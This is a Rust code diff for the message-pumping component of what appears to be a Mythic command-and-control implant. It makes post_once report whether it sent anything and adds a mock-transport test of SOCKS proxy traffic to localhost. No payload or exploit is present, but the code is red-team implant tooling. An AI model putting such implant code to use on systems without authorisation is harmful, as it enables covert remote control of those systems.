@@ -127,7 +127,11 @@ impl ProtocolPump {
         }
     }
 
-    pub fn post_once<C: C2Transport>(&mut self, mythic: &MythicAgent, c2: &C) -> MythicResult<()> {
+    pub fn post_once<C: C2Transport>(
+        &mut self,
+        mythic: &MythicAgent,
+        c2: &C,
+    ) -> MythicResult<bool> {
         let shared = self.build_shared();
         if self.pending.is_empty()
             && shared.socks.is_empty()
@@ -137,7 +141,7 @@ impl ProtocolPump {
             && shared.edges.is_empty()
             && shared.alerts.is_empty()
         {
-            return Ok(());
+            return Ok(false);
         }
 
         let batch = std::mem::take(&mut self.pending);
@@ -151,7 +155,7 @@ impl ProtocolPump {
                     .extend(dispatch::responses_from_post_response_receipts(
                         &receipt.responses,
                     ));
-                Ok(())
+                Ok(true)
             }
             Err(e) => {
                 self.pending.extend(retry_batch);
@@ -170,9 +174,7 @@ impl ProtocolPump {
             if !self.has_pending_work() {
                 return Ok(());
             }
-            let before_pending = self.pending.len();
-            self.post_once(mythic, c2)?;
-            if self.pending.is_empty() && before_pending == 0 {
+            if !self.post_once(mythic, c2)? {
                 return Ok(());
             }
         }
@@ -235,5 +237,89 @@ fn post_response_rich<C: C2Transport>(
         let packed = encode_message_plain(&req, mythic.callback_uuid())?;
         let response = c2.post_response(&packed)?;
         decode_message_plain(&response, Some(mythic.callback_uuid())).map(|(_, r)| r)
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use base64::{Engine, engine::general_purpose::STANDARD};
+    use mythic::SocksMessage;
+    use serde_json::json;
+    use std::sync::Mutex;
+    use uuid::Uuid;
+
+    struct MockC2 {
+        callback_uuid: Uuid,
+        post_count: Mutex<usize>,
+    }
+
+    impl MockC2 {
+        fn new(callback_uuid: Uuid) -> Self {
+            Self {
+                callback_uuid,
+                post_count: Mutex::new(0),
+            }
+        }
+
+        fn post_count(&self) -> usize {
+            *self.post_count.lock().unwrap()
+        }
+    }
+
+    impl C2Transport for MockC2 {
+        fn checkin(&self, _packed: &str) -> MythicResult<String> {
+            Err(MythicError::protocol("unused"))
+        }
+
+        fn get_tasking(&self, _packed: &str) -> MythicResult<String> {
+            Err(MythicError::protocol("unused"))
+        }
+
+        fn post_response(&self, _packed: &str) -> MythicResult<String> {
+            let mut count = self.post_count.lock().unwrap();
+            *count += 1;
+
+            let response = if *count == 1 {
+                json!({
+                    "action": "post_response",
+                    "responses": [],
+                    "socks": [socks_connect_message(2)],
+                })
+            } else {
+                json!({
+                    "action": "post_response",
+                    "responses": [],
+                })
+            };
+            encode_message_plain(&response, self.callback_uuid)
+        }
+    }
+
+    fn socks_connect_message(server_id: u32) -> SocksMessage {
+        SocksMessage {
+            server_id,
+            exit: false,
+            data: Some(STANDARD.encode([5, 1, 0, 1, 127, 0, 0, 1, 0, 1])),
+        }
+    }
+
+    #[test]
+    fn post_until_drained_continues_after_stream_inbound_from_post_response() {
+        let callback_uuid = Uuid::new_v4();
+        let mythic = MythicAgent::new(callback_uuid);
+        let c2 = MockC2::new(callback_uuid);
+        let mut pump = ProtocolPump::new();
+
+        pump.handle_inbound(AgentResponseExtras {
+            socks: vec![socks_connect_message(1)],
+            ..Default::default()
+        });
+
+        pump.post_until_drained(&mythic, &c2).unwrap();
+
+        assert_eq!(c2.post_count(), 2);
+        assert!(!pump.post_once(&mythic, &c2).unwrap());
+        assert_eq!(c2.post_count(), 2);
     }
 }
